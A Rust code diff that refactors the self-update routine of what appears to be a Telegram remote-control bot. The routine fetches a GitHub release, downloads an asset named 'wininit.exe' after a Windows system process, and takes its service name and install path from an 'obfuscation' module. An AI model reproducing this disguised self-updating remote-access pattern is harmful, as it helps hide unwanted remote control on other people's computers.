@@ -2,16 +2,15 @@ use std::path::Path;
 use std::time::Duration;
 
 use anyhow::{Context, Result};
-use windows_service::service::{ServiceAccess, ServiceState};
-use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};
+use serde_json::Value;
 
 use crate::security::obfuscation;
 
 const GITHUB_API: &str = "https://api.github.com/repos/cecon123/tg-remote-bot/releases/latest";
-
 const GITHUB_ASSET: &str = "wininit.exe";
 
-pub async fn check_remote_version() -> Result<Option<String>> {
+/// Fetch the latest release JSON from GitHub API.
+pub async fn fetch_github_release() -> Result<Value> {
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(15))
         .build()?;
@@ -24,47 +23,27 @@ pub async fn check_remote_version() -> Result<Option<String>> {
         .await
         .context("cannot reach GitHub API")?;
 
-    if resp.status() == reqwest::StatusCode::NOT_FOUND {
-        return Ok(None);
-    }
-
     let resp = resp.error_for_status().context("GitHub API error")?;
     let text = resp.text().await.context("cannot read GitHub response")?;
-    let body: serde_json::Value =
-        serde_json::from_str(&text).context("invalid JSON from GitHub")?;
-
-    let tag = body["tag_name"]
-        .as_str()
-        .ok_or_else(|| anyhow::anyhow!("no tag_name in release"))?;
-
-    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
-    let local_ver = env!("CARGO_PKG_VERSION");
-
-    if remote_ver == local_ver {
-        return Ok(None);
-    }
-
-    Ok(Some(remote_ver.to_string()))
+    serde_json::from_str(&text).context("invalid JSON from GitHub")
 }
 
-pub async fn find_asset_url() -> Result<String> {
-    let client = reqwest::Client::builder()
-        .timeout(Duration::from_secs(15))
-        .build()?;
+/// Compare semver strings (major.minor.patch). Returns true if `remote` > `local`.
+fn is_newer(remote: &str, local: &str) -> bool {
+    let r: Vec<u32> = remote.split('.').filter_map(|s| s.parse().ok()).collect();
+    let l: Vec<u32> = local.split('.').filter_map(|s| s.parse().ok()).collect();
+    for i in 0..3 {
+        let rv = r.get(i).copied().unwrap_or(0);
+        let lv = l.get(i).copied().unwrap_or(0);
+        if rv != lv {
+            return rv > lv;
+        }
+    }
+    false
+}
 
-    let resp = client
-        .get(GITHUB_API)
-        .header("User-Agent", "tg-remote-bot")
-        .header("Accept", "application/vnd.github+json")
-        .send()
-        .await
-        .context("cannot reach GitHub API")?;
-
-    let resp = resp.error_for_status().context("GitHub API error")?;
-    let text = resp.text().await.context("cannot read GitHub response")?;
-    let body: serde_json::Value =
-        serde_json::from_str(&text).context("invalid JSON from GitHub")?;
-
+/// Find the download URL for the target asset in a GitHub release body.
+fn find_asset_url(body: &Value) -> Result<String> {
     let assets = body["assets"]
         .as_array()
         .ok_or_else(|| anyhow::anyhow!("no assets in release"))?;
@@ -81,6 +60,26 @@ pub async fn find_asset_url() -> Result<String> {
     anyhow::bail!("asset '{}' not found in release", GITHUB_ASSET);
 }
 
+/// Resolve the download URL for auto-update. Returns None if already up-to-date.
+pub async fn resolve_update_url() -> Result<Option<String>> {
+    let body = fetch_github_release().await?;
+    let tag = body["tag_name"]
+        .as_str()
+        .ok_or_else(|| anyhow::anyhow!("no tag_name in release"))?;
+
+    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
+    let local_ver = env!("CARGO_PKG_VERSION");
+
+    if !is_newer(remote_ver, local_ver) {
+        return Ok(None);
+    }
+
+    log::info!("new version available: {local_ver} -> {remote_ver}");
+    let url = find_asset_url(&body)?;
+    Ok(Some(url))
+}
+
+/// Download a file from `url` to `dest`.
 async fn download_file(url: &str, dest: &Path) -> Result<()> {
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(300))
@@ -103,47 +102,11 @@ async fn download_file(url: &str, dest: &Path) -> Result<()> {
     Ok(())
 }
 
-fn stop_service() -> Result<()> {
-    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
-        .context("cannot open SCM")?;
-
-    let service = manager
-        .open_service(
-            obfuscation::service_name(),
-            ServiceAccess::STOP | ServiceAccess::QUERY_STATUS,
-        )
-        .context("cannot open service")?;
-
-    let _ = service.stop();
-
-    for _ in 0..30 {
-        std::thread::sleep(Duration::from_secs(1));
-        let status = service.query_status()?;
-        if status.current_state == ServiceState::Stopped {
-            return Ok(());
-        }
-    }
-
-    anyhow::bail!("service did not stop within 30s");
-}
-
-fn start_service() -> Result<()> {
-    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
-        .context("cannot open SCM")?;
-
-    let service = manager
-        .open_service(obfuscation::service_name(), ServiceAccess::START)
-        .context("cannot open service")?;
-
-    service.start::<&str>(&[]).context("cannot start service")?;
-    Ok(())
-}
-
+/// Swap the current exe with a newly downloaded one, then exit.
+/// The old binary is renamed to .old (cleaned up on next startup).
 pub async fn apply_update(downloaded: &Path) -> Result<()> {
     let current_exe = std::env::current_exe().context("cannot get current exe path")?;
     let old_path = current_exe.with_extension("old");
-
-    stop_service().context("failed to stop service")?;
 
     if current_exe.exists() {
         std::fs::rename(&current_exe, &old_path).context("cannot rename current exe to .old")?;
@@ -152,31 +115,34 @@ pub async fn apply_update(downloaded: &Path) -> Result<()> {
     std::fs::copy(downloaded, &current_exe).context("cannot copy new binary into place")?;
     let _ = std::fs::remove_file(downloaded);
 
-    start_service().context("failed to start service")?;
-
     std::process::exit(0);
 }
 
+/// Auto-update: check GitHub, download if newer, swap binary and exit.
 pub async fn auto_update() -> Result<bool> {
-    let remote_ver = match check_remote_version().await {
-        Ok(Some(v)) => v,
-        Ok(None) => {
-            log::info!("version is up to date ({})", env!("CARGO_PKG_VERSION"));
-            return Ok(false);
-        }
+    let body = match fetch_github_release().await {
+        Ok(b) => b,
         Err(e) => {
             log::warn!("version check failed: {e:?}");
             return Ok(false);
         }
     };
 
-    log::info!(
-        "new version available: {} -> {}",
-        env!("CARGO_PKG_VERSION"),
-        remote_ver
-    );
+    let tag = match body["tag_name"].as_str() {
+        Some(t) => t,
+        None => return Ok(false),
+    };
+    let remote_ver = tag.strip_prefix('v').unwrap_or(tag);
+    let local_ver = env!("CARGO_PKG_VERSION");
 
-    let url = find_asset_url().await?;
+    if !is_newer(remote_ver, local_ver) {
+        log::info!("version is up to date ({local_ver})");
+        return Ok(false);
+    }
+
+    log::info!("new version available: {local_ver} -> {remote_ver}");
+
+    let url = find_asset_url(&body)?;
     let home = obfuscation::install_home();
     let tmp_path = home.join("_update_tmp.exe");
 
@@ -186,6 +152,7 @@ pub async fn auto_update() -> Result<bool> {
     Ok(true)
 }
 
+/// Manual update: download from `url`, swap binary and exit.
 pub async fn self_update(url: &str) -> Result<()> {
     let home = obfuscation::install_home();
     let tmp_path = home.join("_update_tmp.exe");
